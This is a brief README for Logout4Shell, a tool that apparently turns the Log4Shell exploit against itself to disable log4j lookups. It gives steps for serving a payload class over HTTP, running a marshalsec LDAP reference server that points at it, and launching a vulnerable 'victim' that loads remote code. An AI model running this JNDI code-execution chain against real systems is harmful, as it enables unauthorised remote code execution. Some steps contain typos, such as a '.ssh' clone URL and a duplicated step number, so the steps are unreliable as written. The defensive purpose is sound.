# Logout4Shell

> Using the exploit to enable the log4j FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS configuration for java version <= 1.8.0.121

Step to reproduce：

1. Download the POC, build, make some changes, and run the POC

   1.1 git clone https://github.com/cybereason/Logout4Shell.ssh

   1.2 build it - mvn package

   1.3 cd target/class

   1.4 run the webserver - "python3 -m http.server 8888"

2. Download, build and run an ldap server

   2.1 git clone https://github.com/mbechler/marshalsec.git

   2.2 mvn package

   2.3 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"

3. Run the victim

   3.1 cd Logout4Shell

   3.1 run mvn exec:java -Dexec.mainClass="log4j" -Dcom.sun.jndi.ldap.object.trustURLCodebase=true 

Expected result 
- reloading the log4j configuration with FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true
# Logout4Shell
